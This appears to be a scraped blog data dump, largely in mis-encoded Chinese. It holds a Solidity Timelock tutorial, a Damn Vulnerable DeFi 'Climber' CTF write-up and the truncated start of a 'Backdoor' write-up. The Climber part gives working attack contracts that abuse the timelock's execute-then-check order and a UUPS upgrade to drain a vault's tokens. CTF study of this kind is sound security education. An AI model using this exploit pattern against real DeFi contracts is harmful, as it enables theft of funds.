ï¼Œä»–å¯ä»¥å°†æ™ºèƒ½åˆçº¦çš„æŸäº›åŠŸèƒ½é”å®šä¸€æ®µæ—¶é—´ã€‚å®ƒå¯ä»¥å¤§å¤§æ”¹å–„æ™ºèƒ½åˆçº¦çš„å®‰å…¨æ€§ï¼Œä¸¾ä¸ªä¾‹å­ï¼Œå‡å¦‚ä¸€ä¸ªé»‘å®¢é»‘äº†Uniswapçš„å¤šç­¾ï¼Œå‡†å¤‡æèµ°é‡‘åº“çš„é’±ï¼Œä½†é‡‘åº“åˆçº¦åŠ äº†2å¤©é”å®šæœŸçš„æ—¶é—´é”ï¼Œé‚£ä¹ˆé»‘å®¢ä»åˆ›å»ºæé’±çš„äº¤æ˜“ï¼Œåˆ°å®é™…æŠŠé’±æèµ°ï¼Œéœ€è¦2å¤©çš„ç­‰å¾…æœŸã€‚åœ¨è¿™ä¸€æ®µæ—¶é—´ï¼Œé¡¹ç›®æ–¹å¯ä»¥æ‰¾åº”å¯¹åŠæ³•ï¼ŒæŠ•èµ„è€…å¯ä»¥æå‰æŠ›å”®ä»£å¸å‡å°‘æŸå¤±ã€‚ 2. æ—¶é—´é”åˆçº¦æ—¶é—´é”Timelockåˆçº¦ åœ¨åˆ›å»ºTimelockåˆçº¦æ—¶ï¼Œé¡¹ç›®æ–¹å¯ä»¥è®¾å®šé”å®šæœŸï¼Œå¹¶æŠŠåˆçº¦çš„ç®¡ç†å‘˜è®¾ä¸ºè‡ªå·±ã€‚ æ—¶é—´é”ä¸»è¦æœ‰ä¸‰ä¸ªåŠŸèƒ½ï¼š åˆ›å»ºäº¤æ˜“ï¼Œå¹¶åŠ å…¥åˆ°æ—¶é—´é”é˜Ÿåˆ—ã€‚ åœ¨äº¤æ˜“çš„é”å®šæœŸæ»¡åï¼Œæ‰§è¡Œäº¤æ˜“ã€‚ åæ‚”äº†ï¼Œå–æ¶ˆæ—¶é—´é”é˜Ÿåˆ—ä¸­çš„æŸäº›äº¤æ˜“ã€‚ é¡¹ç›®æ–¹ä¸€èˆ¬ä¼šæŠŠæ—¶é—´é”åˆçº¦è®¾ä¸ºé‡è¦åˆçº¦çš„ç®¡ç†å‘˜ï¼Œä¾‹å¦‚é‡‘åº“åˆçº¦ï¼Œå†é€šè¿‡æ—¶é—´é”æ“ä½œä»–ä»¬ã€‚ æ—¶é—´é”åˆçº¦çš„ç®¡ç†å‘˜ä¸€èˆ¬ä¸ºé¡¹ç›®çš„å¤šç­¾é’±åŒ…ï¼Œä¿è¯å»ä¸­å¿ƒåŒ– çŠ¶æ€å˜é‡ adminï¼šç®¡ç†å‘˜åœ°å€ã€‚ delayï¼šé”å®šæœŸã€‚ GRACE_PERIODï¼šäº¤æ˜“è¿‡æœŸæ—¶é—´ã€‚å¦‚æœäº¤æ˜“åˆ°äº†æ‰§è¡Œçš„æ—¶é—´ç‚¹ï¼Œä½†åœ¨GRACE_PERIODæ²¡æœ‰è¢«æ‰§è¡Œï¼Œå°±ä¼šè¿‡æœŸã€‚ queuedTransactionsï¼šè¿›å…¥æ—¶é—´é”é˜Ÿåˆ—äº¤æ˜“çš„æ ‡è¯†ç¬¦txHashåˆ°boolçš„æ˜ å°„ï¼Œè®°å½•æ‰€æœ‰åœ¨æ—¶é—´é”é˜Ÿåˆ—ä¸­çš„äº¤æ˜“ ä¿®é¥°å™¨ onlyOwner()ï¼šè¢«ä¿®é¥°çš„å‡½æ•°åªèƒ½è¢«ç®¡ç†å‘˜æ‰§è¡Œã€‚ onlyTimelock()ï¼šè¢«ä¿®é¥°çš„å‡½æ•°åªèƒ½è¢«æ—¶é—´é”åˆçº¦æ‰§è¡Œã€‚ å‡½æ•° æ„é€ å‡½æ•°ï¼šåˆå§‹åŒ–äº¤æ˜“é”å®šæ—¶é—´ï¼ˆç§’ï¼‰å’Œç®¡ç†å‘˜åœ°å€ã€‚ queueTransaction()ï¼šåˆ›å»ºäº¤æ˜“å¹¶æ·»åŠ åˆ°æ—¶é—´é”é˜Ÿåˆ—ä¸­ã€‚å‚æ•°æ¯”è¾ƒå¤æ‚ï¼Œå› ä¸ºè¦æè¿°ä¸€ä¸ªå®Œæ•´çš„äº¤æ˜“ï¼š targetï¼šç›®æ ‡åˆçº¦åœ°å€ valueï¼šå‘é€ETHæ•°é¢ signatureï¼šè°ƒç”¨çš„å‡½æ•°ç­¾åï¼ˆfunction signatureï¼‰ dataï¼šäº¤æ˜“çš„call data executeTimeï¼šäº¤æ˜“æ‰§è¡Œçš„åŒºå—é“¾æ—¶é—´æˆ³ã€‚ è°ƒç”¨è¿™ä¸ªå‡½æ•°æ—¶ï¼Œè¦ä¿è¯äº¤æ˜“é¢„è®¡æ‰§è¡Œæ—¶é—´executeTimeå¤§äºå½“å‰åŒºå—é“¾æ—¶é—´æˆ³+é”å®šæ—¶é—´delayã€‚äº¤æ˜“çš„å”¯ä¸€æ ‡è¯†ç¬¦ä¸ºæ‰€æœ‰å‚æ•°çš„å“ˆå¸Œå€¼ï¼Œåˆ©ç”¨getTxHash()å‡½æ•°è®¡ç®—ã€‚è¿›å…¥é˜Ÿåˆ—çš„äº¤æ˜“ä¼šæ›´æ–°åœ¨queuedTransactionså˜é‡ä¸­ï¼Œå¹¶é‡Šæ”¾QueueTransactionäº‹ä»¶ã€‚ executeTransaction()ï¼šæ‰§è¡Œäº¤æ˜“ã€‚å®ƒçš„å‚æ•°ä¸queueTransaction()ç›¸åŒã€‚è¦æ±‚è¢«æ‰§è¡Œçš„äº¤æ˜“åœ¨æ—¶é—´é”é˜Ÿåˆ—ä¸­ï¼Œè¾¾åˆ°äº¤æ˜“çš„æ‰§è¡Œæ—¶é—´ï¼Œä¸”æ²¡æœ‰è¿‡æœŸã€‚æ‰§è¡Œäº¤æ˜“æ—¶ç”¨åˆ°äº†solidityçš„ä½çº§æˆå‘˜å‡½æ•°callï¼Œåœ¨ç¬¬22è®²ä¸­æœ‰ä»‹ç»ã€‚ cancelTransaction()ï¼šå–æ¶ˆäº¤æ˜“ã€‚å®ƒçš„å‚æ•°ä¸queueTransaction()ç›¸åŒã€‚å®ƒè¦æ±‚è¢«å–æ¶ˆçš„äº¤æ˜“åœ¨é˜Ÿåˆ—ä¸­ï¼Œä¼šæ›´æ–°queuedTransactionså¹¶é‡Šæ”¾CancelTransactionäº‹ä»¶ã€‚ changeAdmin()ï¼šä¿®æ”¹ç®¡ç†å‘˜åœ°å€ï¼Œåªèƒ½è¢«Timelockåˆçº¦è°ƒç”¨ã€‚ getBlockTimestamp()ï¼šè·å–å½“å‰åŒºå—é“¾æ—¶é—´æˆ³ã€‚ getTxHash()ï¼šè¿”å›äº¤æ˜“çš„æ ‡è¯†ç¬¦ï¼Œä¸ºå¾ˆå¤šäº¤æ˜“å‚æ•°çš„hash ä»£ç åˆ†æï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142// SPDX-License-Identifier: MITpragma solidity ^0.8.4;contract Timelock&#123; // äº‹ä»¶ // äº¤æ˜“å–æ¶ˆäº‹ä»¶ event CancelTransaction(bytes32 indexed txHash, address indexed target, uint value, string signature, bytes data, uint executeTime); // äº¤æ˜“æ‰§è¡Œäº‹ä»¶ event ExecuteTransaction(bytes32 indexed txHash, address indexed target, uint value, string signature, bytes data, uint executeTime); // äº¤æ˜“åˆ›å»ºå¹¶è¿›å…¥é˜Ÿåˆ— äº‹ä»¶ event QueueTransaction(bytes32 indexed txHash, address indexed target, uint value, string signature, bytes data, uint executeTime); // ä¿®æ”¹ç®¡ç†å‘˜åœ°å€çš„äº‹ä»¶ event NewAdmin(address indexed newAdmin); // çŠ¶æ€å˜é‡ address public admin; // ç®¡ç†å‘˜åœ°å€ uint public constant GRACE_PERIOD = 7 days; // äº¤æ˜“æœ‰æ•ˆæœŸï¼Œè¿‡æœŸçš„äº¤æ˜“ä½œåºŸ uint public delay; // äº¤æ˜“é”å®šæ—¶é—´ ï¼ˆç§’ï¼‰ mapping (bytes32 =&gt; bool) public queuedTransactions; // txHashåˆ°boolï¼Œè®°å½•æ‰€æœ‰åœ¨æ—¶é—´é”é˜Ÿåˆ—ä¸­çš„äº¤æ˜“ // onlyOwner modifier modifier onlyOwner() &#123; require(msg.sender == admin, &quot;Timelock: Caller not admin&quot;); _; &#125; // onlyTimelock modifier modifier onlyTimelock() &#123; require(msg.sender == address(this), &quot;Timelock: Caller not Timelock&quot;); _; &#125; /** * @dev æ„é€ å‡½æ•°ï¼Œåˆå§‹åŒ–äº¤æ˜“é”å®šæ—¶é—´ ï¼ˆç§’ï¼‰å’Œç®¡ç†å‘˜åœ°å€ */ constructor(uint delay_) &#123; delay = delay_; admin = msg.sender; &#125; /** * @dev æ”¹å˜ç®¡ç†å‘˜åœ°å€ï¼Œè°ƒç”¨è€…å¿…é¡»æ˜¯Timelockåˆçº¦ã€‚ */ function changeAdmin(address newAdmin) public onlyTimelock &#123; admin = newAdmin; emit NewAdmin(newAdmin); &#125; /** * @dev åˆ›å»ºäº¤æ˜“å¹¶æ·»åŠ åˆ°æ—¶é—´é”é˜Ÿåˆ—ä¸­ã€‚ * @param target: ç›®æ ‡åˆçº¦åœ°å€ * @param value: å‘é€ethæ•°é¢ * @param signature: è¦è°ƒç”¨çš„å‡½æ•°ç­¾åï¼ˆfunction signatureï¼‰ * @param data: call dataï¼Œé‡Œé¢æ˜¯ä¸€äº›å‚æ•° * @param executeTime: äº¤æ˜“æ‰§è¡Œçš„åŒºå—é“¾æ—¶é—´æˆ³ * * è¦æ±‚ï¼šexecuteTime å¤§äº å½“å‰åŒºå—é“¾æ—¶é—´æˆ³+delay */ function queueTransaction(address target, uint256 value, string memory signature, bytes memory data, uint256 executeTime) public onlyOwner returns (bytes32) &#123; // æ£€æŸ¥ï¼šäº¤æ˜“æ‰§è¡Œæ—¶é—´æ»¡è¶³é”å®šæ—¶é—´ require(executeTime &gt;= getBlockTimestamp() + delay, &quot;Timelock::queueTransaction: Estimated execution block must satisfy delay.&quot;); // è®¡ç®—äº¤æ˜“çš„å”¯ä¸€è¯†åˆ«ç¬¦ï¼šä¸€å †ä¸œè¥¿çš„hash bytes32 txHash = getTxHash(target, value, signature, data, executeTime); // å°†äº¤æ˜“æ·»åŠ åˆ°é˜Ÿåˆ— queuedTransactions[txHash] = true; emit QueueTransaction(txHash, target, value, signature, data, executeTime); return txHash; &#125; /** * @dev å–æ¶ˆç‰¹å®šäº¤æ˜“ã€‚ * * è¦æ±‚ï¼šäº¤æ˜“åœ¨æ—¶é—´é”é˜Ÿåˆ—ä¸­ */ function cancelTransaction(address target, uint256 value, string memory signature, bytes memory data, uint256 executeTime) public onlyOwner&#123; // è®¡ç®—äº¤æ˜“çš„å”¯ä¸€è¯†åˆ«ç¬¦ï¼šä¸€å †ä¸œè¥¿çš„hash bytes32 txHash = getTxHash(target, value, signature, data, executeTime); // æ£€æŸ¥ï¼šäº¤æ˜“åœ¨æ—¶é—´é”é˜Ÿåˆ—ä¸­ require(queuedTransactions[txHash], &quot;Timelock::cancelTransaction: Transaction hasn&#x27;t been queued.&quot;); // å°†äº¤æ˜“ç§»å‡ºé˜Ÿåˆ— queuedTransactions[txHash] = false; emit CancelTransaction(txHash, target, value, signature, data, executeTime); &#125; /** * @dev æ‰§è¡Œç‰¹å®šäº¤æ˜“ã€‚ * * è¦æ±‚ï¼š * 1. äº¤æ˜“åœ¨æ—¶é—´é”é˜Ÿåˆ—ä¸­ * 2. è¾¾åˆ°äº¤æ˜“çš„æ‰§è¡Œæ—¶é—´ * 3. äº¤æ˜“æ²¡è¿‡æœŸ */ function executeTransaction(address target, uint256 value, string memory signature, bytes memory data, uint256 executeTime) public payable onlyOwner returns (bytes memory) &#123; bytes32 txHash = getTxHash(target, value, signature, data, executeTime); // æ£€æŸ¥ï¼šäº¤æ˜“æ˜¯å¦åœ¨æ—¶é—´é”é˜Ÿåˆ—ä¸­ require(queuedTransactions[txHash], &quot;Timelock::executeTransaction: Transaction hasn&#x27;t been queued.&quot;); // æ£€æŸ¥ï¼šè¾¾åˆ°äº¤æ˜“çš„æ‰§è¡Œæ—¶é—´ require(getBlockTimestamp() &gt;= executeTime, &quot;Timelock::executeTransaction: Transaction hasn&#x27;t surpassed time lock.&quot;); // æ£€æŸ¥ï¼šäº¤æ˜“æ²¡è¿‡æœŸ require(getBlockTimestamp() &lt;= executeTime + GRACE_PERIOD, &quot;Timelock::executeTransaction: Transaction is stale.&quot;); // å°†äº¤æ˜“ç§»å‡ºé˜Ÿåˆ— queuedTransactions[txHash] = false; // è·å–call data bytes memory callData; if (bytes(signature).length == 0) &#123; callData = data; &#125; else &#123; callData = abi.encodePacked(bytes4(keccak256(bytes(signature))), data); &#125; // åˆ©ç”¨callæ‰§è¡Œäº¤æ˜“ (bool success, bytes memory returnData) = target.call&#123;value: value&#125;(callData); require(success, &quot;Timelock::executeTransaction: Transaction execution reverted.&quot;); emit ExecuteTransaction(txHash, target, value, signature, data, executeTime); return returnData; &#125; /** * @dev è·å–å½“å‰åŒºå—é“¾æ—¶é—´æˆ³ */ function getBlockTimestamp() public view returns (uint) &#123; return block.timestamp; &#125; /** * @dev å°†ä¸€å †ä¸œè¥¿æ‹¼æˆäº¤æ˜“çš„æ ‡è¯†ç¬¦ */ function getTxHash( address target, uint value, string memory signature, bytes memory data, uint executeTime ) public pure returns (bytes32) &#123; return keccak256(abi.encode(target, value, signature, data, executeTime)); &#125;&#125; 3. Remixæ¼”ç¤ºæ¼”ç¤º 4. å‚è€ƒåšå®¢WTF-TimeLock","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"}],"tags":[{"name":"Timelock","slug":"Timelock","permalink":"https://biyouqiuqiu.com/tags/Timelock/"}]},{"title":"Climber","slug":"CTFS/damn defi/Climber","date":"2023-07-20T03:37:10.000Z","updated":"2023-07-20T03:37:10.000Z","comments":true,"path":"2023/07/20/CTFS/damn defi/Climber/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/20/CTFS/damn%20defi/Climber/","excerpt":"","text":"1. issue Thereâ€™s a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the UUPS pattern. The owner of the vault, currently a timelock contract, can withdraw a very limited amount of tokens every 15 days. On the vault thereâ€™s an additional role with powers to sweep all tokens in case of an emergency. On the timelock, only an account with a â€œProposerâ€ role can schedule actions that can be executed 1 hour later. To pass this challenge, take all tokens from the vault. è¦æ±‚ï¼šä»ä¿é™©åº“ä¸­å–å‡ºæ‰€æœ‰ä»£å¸ é¢˜ç›®é“¾æ¥ 2. analysing2.1 ClimberVault.solåœ¨æœ¬åˆçº¦ä¸­æœ‰ä¸¤ä¸ªå‡½æ•°å¯ä»¥ä»ä¸­å–é’±ï¼Œä¸€ä¸ªæ˜¯withdrawä¸€ä¸ªæ˜¯sweepFundsï¼Œé‡‘åº“é‡Œé¢æœ‰10 millionï¼Œè€Œwithdrawä¸€æ¬¡æ€§åªèƒ½å–1ä¸ªï¼Œæ˜¾ç„¶è¯¥æ–¹æ³•ä¸å¯é ã€‚æ‰€ä»¥åªèƒ½é€šè¿‡sweepFundsä¸€æ¬¡æ€§å°†æ‰€æœ‰çš„ä»£å¸ä¸€æ‰«è€Œç©ºï¼Œä½†æ˜¯ä»–æœ‰ä¸€ä¸ªé™åˆ¶ï¼Œä¾¿æ˜¯åªæœ‰sweeperï¼Œæ‰èƒ½è°ƒç”¨æ­¤æ“ä½œï¼Œå¯æ˜¯å‡½æ•°åœ¨initializeåˆå§‹åŒ–ä¸­å°±å·²ç»å°†sweeperçš„å€¼ç»™è®¾ç½®å¥½äº†ï¼Œæˆ‘æ— æ³•ä¿®æ”¹ï¼Œçœ‹ä¼¼å·²ç»æ— è§£äº†ã€‚ä½†æ˜¯è¯¥åˆçº¦æ˜¯ä¸€ä¸ªå¯å‡çº§ï¼Œåªè¦å°†è¯¥åˆçº¦å‡çº§ï¼Œä¸”å‡çº§åçš„åˆçº¦ä¸­sweepFundså‡½æ•°æ²¡æœ‰äº†é™åˆ¶ï¼Œé‚£å°±å¯ä»¥è§£å†³äº†ã€‚ ğŸ“ŒAIè§£è¯»ï¼š åœ¨ä½¿ç”¨ OpenZeppelin å‡çº§åº“è¿›è¡Œåˆçº¦å‡çº§æ—¶ï¼ŒåŸæ¥çš„å‡½æ•°ä»ç„¶å¯ä»¥ä½¿ç”¨ï¼Œä½†æ˜¯è¿™äº›å‡½æ•°çš„å®ç°å¯èƒ½å·²ç»è¢«å‡çº§åˆçº¦ä¸­çš„æ–°å®ç°æ‰€è¦†ç›–ã€‚ è¿™æ˜¯å› ä¸ºï¼Œåœ¨ä½¿ç”¨å‡çº§åº“è¿›è¡Œåˆçº¦å‡çº§æ—¶ï¼ŒåŸå§‹åˆçº¦çš„ä»£ç å’Œæ•°æ®å­˜å‚¨è¢«è½¬ç§»åˆ°äº†ä»£ç†åˆçº¦ä¸­ï¼Œå¹¶ä¸”åŸå§‹åˆçº¦çš„å‡½æ•°è°ƒç”¨è¢«é‡å®šå‘åˆ°ä»£ç†åˆçº¦ã€‚åœ¨ä»£ç†åˆçº¦çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œæ‰€æœ‰çš„å‡½æ•°è°ƒç”¨éƒ½ä¼šè¢«è·¯ç”±åˆ°å½“å‰å®ç°çš„ç‰ˆæœ¬ã€‚å¦‚æœå‡çº§åˆçº¦ä¸­çš„æ–°å®ç°ä¸åŸå§‹åˆçº¦ä¸­çš„å‡½æ•°å…·æœ‰ç›¸åŒçš„åç§°ï¼Œåˆ™ä»£ç†åˆçº¦å°†ä½¿ç”¨å‡çº§åˆçº¦ä¸­çš„æ–°å®ç°æ¥å¤„ç†è¿™äº›å‡½æ•°è°ƒç”¨ã€‚ ç„¶è€Œï¼Œå¦‚æœåŸå§‹åˆçº¦ä¸­çš„å‡½æ•°æ²¡æœ‰è¢«å‡çº§åˆçº¦ä¸­çš„æ–°å®ç°æ‰€è¦†ç›–ï¼Œåˆ™ä»£ç†åˆçº¦å°†ç»§ç»­ä½¿ç”¨åŸå§‹åˆçº¦ä¸­çš„å‡½æ•°å®ç°æ¥å¤„ç†è¿™äº›å‡½æ•°è°ƒç”¨ã€‚ ç°åœ¨è¦æ‰¾å‡çº§åˆçº¦çš„å…¥å£ã€‚ 2.2 ClimberTimelock.solåˆ†æè¯¥åˆçº¦å’‹ä¸€çœ‹ï¼Œæ‰§è¡Œçš„é€»è¾‘æ˜¯ï¼šå…ˆæ‰§è¡Œé€šè¿‡scheduleæ‰èƒ½æ‰§è¡Œé€šè¿‡executeï¼Œä½†ä»”ç»†çœ‹ 1234567891011121314for (uint8 i = 0; i &lt; targets.length;) &#123; // è°ƒç”¨dataElements[i]å‡½æ•°ï¼Œå‘é€values[i] ETH // åº•å±‚ä¸­ call çš„è°ƒç”¨è€…æ˜¯æœ¬åˆçº¦ targets[i].functionCallWithValue(dataElements[i], values[i]); unchecked &#123; ++i; &#125;&#125;if (getOperationState(id) != OperationState.ReadyForExecution) &#123; revert NotReadyForExecution(id);&#125; å…ˆæ‰§è¡Œå†åˆ¤æ–­ï¼Œè¿™å°±æ˜¯æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆé€šè¿‡functionCallWithValueæ‰§è¡Œscheduleå‡½æ•°ï¼Œç„¶åå°±å¯ä»¥é¡ºåˆ©é€šè¿‡æ¥ä¸‹æ¥çš„æ–­è¨€ã€‚ä½†æ˜¯è¿™ä¸ªä¸€ä¸ªå¾ªç¯ï¼Œä¸”å¾ªç¯æ¬¡æ•°ç”±è‡ªå·±ç¡®å®šï¼Œæˆ‘ä¾¿å¯ä»¥åœ¨é‡Œé¢åšå¾ˆå¤šæƒ³åšçš„äº‹æƒ…ã€‚è¦æ‰§è¡Œé€šè¿‡scheduleï¼Œçš„è¦æ±‚æ˜¯è°ƒç”¨è€…å¾—æ˜¯PROPOSER_ROLEï¼Œåˆå› ä¸º_setRoleAdmin(PROPOSER_ROLE, ADMIN_ROLE)å’Œ_setupRole(ADMIN_ROLE, address(this))ï¼Œä½¿å¾—æœ¬åˆçº¦æ‹¥æœ‰å¯¹PROPOSER_ROLEæˆå‘˜çš„æˆæƒåŠŸèƒ½ï¼Œæ‰€ä»¥å¯ä»¥å°†hackeræˆæƒç»™PROPOSER_ROLEã€‚ ğŸ“Œæ³¨æ„ï¼š æœ¬èº«grantRoleå‡½æ•°æ˜¯ï¼ŒClimberTimelockåˆçº¦è‡ªèº«çš„å‡½æ•°ï¼ŒæŒ‰ç†æ¥è¯´ï¼ŒåŠæ—¶åˆçº¦æœ¬èº«æ˜¯ getRoleAdmin(role) è§’è‰²çš„ç®¡ç†å‘˜ï¼Œä½†æ˜¯ç”±äºåœ¨è‡ªèº«åˆçº¦ä¸­ï¼Œå…¶æ— æ³•æ»¡è¶³onlyRoleä¿®é¥°å™¨ä¸­çš„_checkRole(role, _msgSender())è¯­å¥ï¼Œä½†æ˜¯targets[i].functionCallWithValue(dataElements[i], values[i])åˆ™æ˜¯é€šè¿‡åº“åˆçº¦è°ƒè‡ªå·±å‡½æ•°ï¼Œè¿™æ ·ä¸€æ¥ï¼Œmsg.senderä¾¿æ˜¯ClimberTimelockæœ¬èº«äº†ï¼Œè¿™æ ·ä¸€æ¥å°±å¯ä»¥æˆåŠŸé€šè¿‡é€‰æ‹©å™¨çš„é™åˆ¶ã€‚ æˆæƒè¿‡åï¼Œå°†delayç½®é›¶ï¼Œè¯¥å‡½æ•°çš„æ–­è¨€ if (msg.sender != address(this))çš„é€šè¿‡åŸç†åŒä¸Šã€‚ æœ€åå°†åˆçº¦å‡çº§è°ƒç”¨upgradeToå‡½æ•°ï¼Œè¯¥å‡½æ•°æ˜¯åœ¨ClimberVaultåˆçº¦ä¸­çš„ï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸ŠåŸç†é€šè¿‡æ–­è¨€require(address(this) != __self, &quot;Function must be called through delegatecall&quot;)ï¼Œè¿™é‡Œåº“åˆçº¦çš„ç”¨æ³•å¾ˆæ˜¯ç„å¦™~ æ‹ä¸€ä¸‹ï¼Œåšé¢˜æ€è·¯ä¸º: 123456/* 1. (grantRole) å°† PROPOSER_ROLE çš„èº«ä»½æˆäºˆ hacker: target=timelock 2. (updateDelay) å°† delay ä¿®æ”¹ä¸º 0: target=timelock 3. (schedule) è¿›è¡Œæ’é˜Ÿ: target=hacker 4. (upgradeTo) å°†åˆçº¦å‡çº§ï¼Œè¦†ç›–æ‰ä¹‹é—´çš„ sweepFunds() å‡½æ•°: target=vault*/ 3. solving3.1 ClimberHack.sol123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;./ClimberVault.sol&quot;;import &quot;hardhat/console.sol&quot;;/** ç¼–å†™æ”»å‡»åˆçº¦ */contract ClimberHack &#123; ClimberVault vault; ClimberTimelock timelock; address fakeVault; address token; address[] targets; uint256[] values; bytes[] dataElements; constructor( address _vault, address payable _timelock, address _fakeVault, address _token )&#123; vault = ClimberVault(_vault); timelock = ClimberTimelock(_timelock); fakeVault = _fakeVault; token = _token; targets = [address(timelock), address(timelock), address(this), address(vault)]; values = [0, 0, 0, 0]; dataElements = [ abi.encodeWithSignature(&quot;grantRole(bytes32,address)&quot;, PROPOSER_ROLE, address(this)), abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0), abi.encodeWithSignature(&quot;fakeSchedule()&quot;), abi.encodeWithSignature(&quot;upgradeTo(address)&quot;, fakeVault)]; &#125; function attack() external returns (bool success) &#123; timelock.execute(targets, values, dataElements, &quot;&quot;); (success, ) = address(vault).call(abi.encodeWithSignature(&quot;sweepFunds(address,address)&quot;, token, msg.sender)); &#125; function fakeSchedule() public &#123; // msg.sender = hacker timelock.schedule(targets, values, dataElements, &quot;&quot;); &#125;&#125; 3.2 FakeVault.sol12345678910111213141516171819202122// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;./ClimberVault.sol&quot;;import &quot;hardhat/console.sol&quot;;/** å¾…å‡çº§åˆçº¦ï¼Œéœ€è¦è¦†ç›–æ‰ sweepFunds(address) å‡½æ•° */contract FakeVault is UUPSUpgradeable &#123; /** å…¶ä¸­çŠ¶æ€å˜é‡çš„å€¼çš„ä½ç½®éœ€è¦å’ŒClimberVaultä¸­çš„ä½ç½®ç›¸å¯¹åº” */ uint256 private _lastWithdrawalTimestamp; address private _sweeper; /** é‡å†™ sweepFunds() å‡½æ•°è¦†ç›–è°ƒä¹‹å‰çš„ sweepFunds() å‡½æ•°ï¼Œä¸¢æ‰ onlySweeper é™åˆ¶ */ function sweepFunds(address token, address player) external &#123; console.log(&quot;fakevault&#x27;address_this = &quot;, address(this)); SafeTransferLib.safeTransfer(token, player, IERC20(token).balanceOf(address(this))); &#125; /** è¿™æ˜¯æŠ½è±¡åˆçº¦å¿…é¡»è¦å®ç°çš„å‡½æ•° */ function _authorizeUpgrade(address newImplementation) internal override &#123;&#125;&#125; 3.3 challenge.js123456789101112it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ const fakeVault = await (await ethers.getContractFactory(&quot;FakeVault&quot;, player)).deploy(); const hacker = await (await ethers.getContractFactory(&quot;ClimberHack&quot;, player)).deploy( vault.address, timelock.address, fakeVault.address, token.address ); await hacker.attack(); console.log(&quot;fakeVaule = &quot;,fakeVault.address); console.log(&quot;climberVault =&quot;, vault.address);&#125;); è¿è¡Œç»“æœ ç”±ç»“æœä¸éš¾çœ‹å‡ºæˆ‘çš„æƒ³æ³•æ˜¯æ­£ç¡®çš„ï¼ŒFakeVaultåˆçº¦çš„sweepFundså‡½æ•°æ˜¯åœ¨climberVaultä¸­æ‰§è¡Œçš„ å…¶ä¸­ï¼Œé‡‡ç”¨ä½çº§è°ƒç”¨address(vault).call(abi.encodeWithSignature(&quot;sweepFunds(address,address)&quot;, token, msg.sender))ï¼Œè€Œä¸ç›´ç›´æ¥ç”¨vaultè°ƒç”¨æ˜¯å› ä¸ºè¯¥å‡½æ•°å·²ç»é‡å†™äº†ï¼Œç¼–è¯‘æŠ¥é”™ã€‚ è§£é¢˜æˆåŠŸã€‚","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"Backdoor","slug":"CTFS/damn defi/Backdoor","date":"2023-07-20T02:37:10.000Z","updated":"2023-07-20T02:37:10.000Z","comments":true,"path":"2023/07/20/CTFS/damn defi/Backdoor/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/20/CTFS/damn%20defi/Backdoor/","excerpt":"","text":"1. issue To incentivize the creation of more secure wallets in their team, someone has deployed a registry of Gnosis Safe wallets. When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens. To make sure everything is safe and sound, the registry tightly integrates with the legitimate Gnosis Safe Proxy Factory, and has some additional safety checks. Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them. Your goal is to take all funds from the registry. In a single transaction. ç›®æ ‡ï¼šåœ¨å•ç¬”äº¤æ˜“ä¸­ï¼Œå°† æ³¨å†Œè¡¨ä¸­çš„èµ„é‡‘å…¨éƒ¨æç©º é¢˜ç›®é“¾æ¥ 2. analysing ğŸ“Œ emmmï¼Œå¯¹æˆ‘è¿™ä¸ªèœé¸¡æ¥è¯´ï¼Œè¿™é“é¢˜éš¾åº¦ä¹Ÿæ˜¯ç›¸å½“ç‚¸è£‚çš„ã€‚åœ¨åšè¿™é“é¢˜çš„æ—¶å€™æˆ‘æŠŠ GnosisSafeProxyå’Œ GnosisSafeè¿™ä¸€ç³»åˆ—åˆçº¦éƒ½çœ‹äº†ï¼ŒæŠŠä»£ç çš„é€»è¾‘å¼„æ‡‚ï¼Œå›è¿‡å¤´æ¥æ‰å‹‰å‹‰å¼ºå¼ºå¯ä»¥ç†è§£é¢˜ç›®çš„ç”¨æ„ã€‚ è¿™é“é¢˜ç»™æˆ‘å¸¦æ¥å·¨å¤§çš„éœ‡æ’¼ï¼Œé¢˜ç›®ä»£ç è¶Šå¾€æ·±å¤„æƒ³ï¼Œå¸¦æ¥çš„éœ‡æ’¼å°±è¶Šå¤§ã€‚å‡ºé¢˜äººçœŸçš„å¤ªç‰›äº†ã€‚ 2.1 requestè®©æˆ‘ä»¬å…ˆçœ‹ challenge.jsä¸­çš„è¦æ±‚ï¼š 1234567891011121314151617181920212223242526after(async function () &#123; /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */ // Player must have used a single transaction expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1); for (let i = 0; i &lt; users.length; i++) &#123; let wallet = await walletRegistry.wallets(users[i]); // User must have registered a wallet expect(wallet).to.not.eq( ethers.constants.AddressZero, &#x27;User did not register a wallet&#x27; ); // User is no longer registered as a beneficiary expect( await walletRegistry.beneficiaries(users[i]) ).to.be.false; &#125; // Player must own all tokens expect( await token.balanceOf(player.address) ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);&#125;); è§£è¯»ï¼š ç¬¬ä¸€å¥æ–­è¨€è¦æ±‚ç©å®¶playeråªèƒ½è¿›è¡Œä¸€ç¬”äº¤æ˜“ï¼› ç¬¬äºŒå¥æ–­è¨€è¦æ±‚ 